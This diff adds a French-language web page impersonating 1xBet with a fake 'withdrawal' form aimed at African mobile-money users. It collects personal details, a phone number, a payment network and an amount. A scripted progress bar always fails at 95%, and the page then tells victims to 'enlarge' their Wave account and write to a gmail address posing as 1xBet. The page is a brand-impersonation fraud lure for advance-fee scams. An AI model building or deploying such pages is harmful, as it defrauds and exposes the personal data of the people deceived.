@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1xBet - Inscription</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-blue: #1a3a8f;
+            --secondary-blue: #2d5bb5;
+            --light-blue: #4a90e2;
+            --accent-blue: #87ceeb;
+            --white: #ffffff;
+            --light-gray: #f5f7fa;
+            --dark-text: #2c3e50;
+            --success: #27ae60;
+            --error-red: #e74c3c;
+            --warning: #f39c12;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            color: var(--dark-text);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120"><rect width="120" height="120" fill="%231a3a8f"/><path d="M0 20L120 20 M0 40L120 40 M0 60L120 60 M0 80L120 80 M0 100L120 100" stroke="%232d5bb5" stroke-width="2"/><circle cx="60" cy="60" r="40" fill="none" stroke="%234a90e2" stroke-width="2" stroke-dasharray="5,5"/></svg>');
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            font-size: 3.5rem;
+            font-weight: 800;
+            color: var(--white);
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            color: var(--accent-blue);
+            font-weight: 500;
+            letter-spacing: 1px;
+        }
+        
+        .card {
+            background-color: var(--white);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--primary-blue);
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--primary-blue);
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 14px 15px;
+            background-color: var(--light-gray);
+            border: 2px solid transparent;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+            color: var(--dark-text);
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--light-blue);
+            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.3);
+            background-color: var(--white);
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .form-row .form-group {
+            flex: 1;
+        }
+        
+        .phone-input-container {
+            display: flex;
+        }
+        
+        .phone-prefix {
+            width: 90px;
+            padding: 14px 10px;
+            background-color: var(--light-blue);
+            color: white;
+            border: 2px solid transparent;
+            border-radius: 8px 0 0 8px;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .phone-number {
+            flex: 1;
+            border-radius: 0 8px 8px 0;
+            border-left: none;
+        }
+        
+        .currency-indicator {
+            position: relative;
+        }
+        
+        .currency-indicator::after {
+            content: "FCFA";
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: var(--light-blue);
+            color: var(--white);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .radio-group {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .radio-option {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .radio-option input {
+            width: auto;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(to right, var(--light-blue), var(--secondary-blue));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 20px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(74, 144, 226, 0.4);
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(to right, var(--secondary-blue), var(--primary-blue));
+            box-shadow: 0 6px 20px rgba(74, 144, 226, 0.6);
+            transform: translateY(-2px);
+        }
+        
+        .error {
+            color: var(--error-red);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* Page de confirmation */
+        #confirmation-page {
+            display: none;
+        }
+        
+        .summary-item {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(44, 62, 80, 0.1);
+            display: flex;
+        }
+        
+        .summary-label {
+            font-weight: 600;
+            color: var(--primary-blue);
+            width: 40%;
+        }
+        
+        .summary-value {
+            width: 60%;
+        }
+        
+        .progress-container {
+            margin-top: 40px;
+            background-color: var(--light-gray);
+            padding: 30px;
+            border-radius: 10px;
+            border: 1px solid rgba(74, 144, 226, 0.2);
+            text-align: center;
+        }
+        
+        .loading-icon {
+            font-size: 3rem;
+            color: var(--light-blue);
+            margin-bottom: 20px;
+            animation: spin 2s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background-color: rgba(255, 255, 255, 0.5);
+            border-radius: 10px;
+            margin-bottom: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(to right, var(--light-blue), var(--secondary-blue));
+            width: 0%;
+            border-radius: 10px;
+            transition: width 0.5s ease, background 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-fill.error {
+            background: linear-gradient(to right, var(--error-red), #c0392b);
+        }
+        
+        .progress-fill::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: linear-gradient(
+                -45deg,
+                rgba(255, 255, 255, 0.2) 25%,
+                transparent 25%,
+                transparent 50%,
+                rgba(255, 255, 255, 0.2) 50%,
+                rgba(255, 255, 255, 0.2) 75%,
+                transparent 75%,
+                transparent
+            );
+            background-size: 50px 50px;
+            animation: move 2s linear infinite;
+        }
+        
+        @keyframes move {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+        
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: var(--dark-text);
+        }
+        
+        .status-message {
+            text-align: center;
+            margin-top: 20px;
+            font-weight: 500;
+            color: var(--primary-blue);
+            font-size: 1.1rem;
+        }
+        
+        .status-message.error {
+            color: var(--error-red);
+        }
+        
+        .verification-title {
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--primary-blue);
+        }
+        
+        .highlight {
+            color: var(--light-blue);
+        }
+        
+        /* Popup d'erreur */
+        .error-popup {
+            display: none;
+            background-color: #fff3f3;
+            border: 2px solid var(--error-red);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 25px;
+            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
+        }
+        
+        .error-popup h3 {
+            color: var(--error-red);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .error-popup p {
+            color: var(--dark-text);
+            line-height: 1.5;
+        }
+        
+        .error-popup .email {
+            color: var(--primary-blue);
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .logo {
+                font-size: 2.8rem;
+            }
+            
+            .card {
+                padding: 25px;
+            }
+            
+            .radio-group {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Page du formulaire -->
+    <div id="form-page" class="container">
+        <div class="logo-container">
+            <div class="logo">1xBet</div>
+            <div class="tagline">PROFESSIONAL BETTING</div>
+        </div>
+        
+        <div class="card">
+            <h2 class="form-title">Formulaire de retrait</h2>
+            <form id="registration-form">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="nom">Nom</label>
+                        <input type="text" id="nom" name="nom" required>
+                        <div class="error" id="nom-error">Veuillez saisir votre nom</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="prenom">Prénom</label>
+                        <input type="text" id="prenom" name="prenom" required>
+                        <div class="error" id="prenom-error">Veuillez saisir votre prénom</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="age">Âge</label>
+                    <input type="number" id="age" name="age" min="18" max="100" required>
+                    <div class="error" id="age-error">Vous devez avoir au moins 18 ans pour vous inscrire</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="metier">Métier</label>
+                    <input type="text" id="metier" name="metier" required>
+                    <div class="error" id="metier-error">Veuillez saisir votre métier</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="adresse">Adresse</label>
+                    <input type="text" id="adresse" name="adresse" required>
+                    <div class="error" id="adresse-error">Veuillez saisir votre adresse</div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="pays">Pays</label>
+                        <select id="pays" name="pays" required>
+                            <option value="">Sélectionnez votre pays</option>
+                            <option value="cote-ivoire">Côte d'Ivoire</option>
+                            <option value="senegal">Sénégal</option>
+                            <option value="cameroun">Cameroun</option>
+                            <option value="nigeria">Nigéria</option>
+                            <option value="ghana">Ghana</option>
+                            <option value="kenya">Kenya</option>
+                            <option value="afrique-sud">Afrique du Sud</option>
+                            <option value="maroc">Maroc</option>
+                            <option value="tunisie">Tunisie</option>
+                            <option value="egypte">Égypte</option>
+                            <option value="rdc">RDC</option>
+                        </select>
+                        <div class="error" id="pays-error">Veuillez sélectionner votre pays</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="ville">Ville</label>
+                        <input type="text" id="ville" name="ville" required>
+                        <div class="error" id="ville-error">Veuillez saisir votre ville</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="telephone">Numéro de téléphone</label>
+                    <div class="phone-input-container">
+                        <div class="phone-prefix" id="phone-prefix">+225</div>
+                        <input type="tel" id="telephone" name="telephone" class="phone-number" pattern="[0-9]{8,10}" required>
+                    </div>
+                    <div class="error" id="telephone-error">Veuillez saisir un numéro de téléphone valide</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="reseau">Réseau Mobile</label>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" id="moov" name="reseau" value="Moov" required>
+                            <label for="moov">Moov</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" id="wave" name="reseau" value="Wave">
+                            <label for="wave">Wave</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" id="orange" name="reseau" value="Orange">
+                            <label for="orange">Orange</label>
+                        </div>
+                        <div class="radio-option">
+                            <input type="radio" id="mtn" name="reseau" value="MTN">
+                            <label for="mtn">MTN</label>
+                        </div>
+                    </div>
+                    <div class="error" id="reseau-error">Veuillez sélectionner un réseau mobile</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="montant">Montant (FCFA)</label>
+                    <input type="number" id="montant" name="montant" min="5000" step="100" class="currency-indicator" required>
+                    <div class="error" id="montant-error">Le dépôt initial doit être d'au moins 5 000 FCFA</div>
+                </div>
+                
+                <button type="submit" class="submit-btn">Valider mon compte</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Page de confirmation -->
+    <div id="confirmation-page" class="container">
+        <div class="logo-container">
+            <div class="logo">1xBet</div>
+            <div class="tagline">VÉRIFICATION DU COMPTE</div>
+        </div>
+        
+        <div class="card">
+            <h2 class="verification-title">Résumé de votre <span class="highlight">retrait</span></h2>
+            
+            <div id="summary">
+                <!-- Les informations du résumé seront insérées ici par JavaScript -->
+            </div>
+            
+            <div class="progress-container">
+                <div class="loading-icon">
+                    <i class="fas fa-cog"></i>
+                </div>
+                <h3 style="text-align: center; margin-bottom: 20px; color: var(--primary-blue);">Vérification en cours</h3>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+                <div class="progress-text">
+                    <span>0%</span>
+                    <span id="progress-percentage">0%</span>
+                    <span>100%</span>
+                </div>
+                <div class="status-message" id="status-message">Traitement en cours...</div>
+                
+                <div class="error-popup" id="error-popup">
+                    <h3><i class="fas fa-exclamation-triangle"></i> IMPORTANT : Erreur de Traitement de la Demande</h3>
+                    <p>Votre transaction n'a pas pu être finalisée. Veuillez élargir votre compte Wave et réessayer plus tard.</p>
+                    <p class="email">Ou contactez-nous via notre ADRESSE EMAIL : no.reply1xbetsponsor@gmail.com</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('registration-form');
+            const formPage = document.getElementById('form-page');
+            const confirmationPage = document.getElementById('confirmation-page');
+            const summaryElement = document.getElementById('summary');
+            const progressFill = document.getElementById('progress-fill');
+            const progressPercentage = document.getElementById('progress-percentage');
+            const statusMessage = document.getElementById('status-message');
+            const errorPopup = document.getElementById('error-popup');
+            const paysSelect = document.getElementById('pays');
+            const phonePrefix = document.getElementById('phone-prefix');
+            
+            // Tableau des préfixes téléphoniques par pays
+            const countryPrefixes = {
+                'cote-ivoire': '+225',
+                'senegal': '+221',
+                'cameroun': '+237',
+                'nigeria': '+234',
+                'ghana': '+233',
+                'kenya': '+254',
+                'afrique-sud': '+27',
+                'maroc': '+212',
+                'tunisie': '+216',
+                'egypte': '+20',
+                'rdc': '+243'
+            };
+            
+            // Mettre à jour le préfixe téléphonique en fonction du pays sélectionné
+            paysSelect.addEventListener('change', function() {
+                const selectedCountry = this.value;
+                if (selectedCountry && countryPrefixes[selectedCountry]) {
+                    phonePrefix.textContent = countryPrefixes[selectedCountry];
+                }
+            });
+            
+            // Validation du formulaire
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Réinitialiser les messages d'erreur
+                const errorElements = document.querySelectorAll('.error');
+                errorElements.forEach(error => error.style.display = 'none');
+                
+                let isValid = true;
+                
+                // Validation de chaque champ
+                const nom = document.getElementById('nom');
+                if (!nom.value.trim()) {
+                    document.getElementById('nom-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const prenom = document.getElementById('prenom');
+                if (!prenom.value.trim()) {
+                    document.getElementById('prenom-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const age = document.getElementById('age');
+                if (!age.value || age.value < 18 || age.value > 100) {
+                    document.getElementById('age-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const metier = document.getElementById('metier');
+                if (!metier.value.trim()) {
+                    document.getElementById('metier-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const adresse = document.getElementById('adresse');
+                if (!adresse.value.trim()) {
+                    document.getElementById('adresse-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const pays = document.getElementById('pays');
+                if (!pays.value) {
+                    document.getElementById('pays-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const ville = document.getElementById('ville');
+                if (!ville.value.trim()) {
+                    document.getElementById('ville-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const telephone = document.getElementById('telephone');
+                const phonePattern = /^[0-9]{8,10}$/;
+                if (!phonePattern.test(telephone.value)) {
+                    document.getElementById('telephone-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const reseau = document.querySelector('input[name="reseau"]:checked');
+                if (!reseau) {
+                    document.getElementById('reseau-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                const montant = document.getElementById('montant');
+                if (!montant.value || montant.value < 5000) {
+                    document.getElementById('montant-error').style.display = 'block';
+                    isValid = false;
+                }
+                
+                if (isValid) {
+                    // Afficher le résumé
+                    displaySummary();
+                    
+                    // Passer à la page de confirmation
+                    formPage.style.display = 'none';
+                    confirmationPage.style.display = 'block';
+                    
+                    // Lancer la barre de progression
+                    startProgressBar();
+                }
+            });
+            
+            function displaySummary() {
+                const formData = new FormData(form);
+                let summaryHTML = '';
+                
+                for (let [key, value] of formData.entries()) {
+                    let label = '';
+                    switch(key) {
+                        case 'nom': label = 'Nom'; break;
+                        case 'prenom': label = 'Prénom'; break;
+                        case 'age': label = 'Âge'; break;
+                        case 'metier': label = 'Métier'; break;
+                        case 'adresse': label = 'Adresse'; break;
+                        case 'pays': label = 'Pays'; break;
+                        case 'ville': label = 'Ville'; break;
+                        case 'telephone': 
+                            label = 'Numéro de téléphone'; 
+                            value = phonePrefix.textContent + ' ' + value; 
+                            break;
+                        case 'reseau': label = 'Réseau Mobile'; break;
+                        case 'montant': label = 'Montant'; value = new Intl.NumberFormat('fr-FR').format(value) + ' FCFA'; break;
+                    }
+                    
+                    summaryHTML += `
+                        <div class="summary-item">
+                            <span class="summary-label">${label}:</span>
+                            <span class="summary-value">${value}</span>
+                        </div>
+                    `;
+                }
+                
+                summaryElement.innerHTML = summaryHTML;
+            }
+            
+            function startProgressBar() {
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 5;
+                    if (progress <= 95) {
+                        progressFill.style.width = `${progress}%`;
+                        progressPercentage.textContent = `${progress}%`;
+                        
+                        if (progress === 95) {
+                            // Simulation d'échec à 95%
+                            progressFill.classList.add('error');
+                            statusMessage.textContent = 'Une erreur s\'est produite suite au non autorisations de votre compte.';
+                            statusMessage.classList.add('error');
+                            errorPopup.style.display = 'block';
+                            clearInterval(interval);
+                        }
+                    }
+                }, 200);
+            }
+        });
+    </script>
+</body>
+</html>
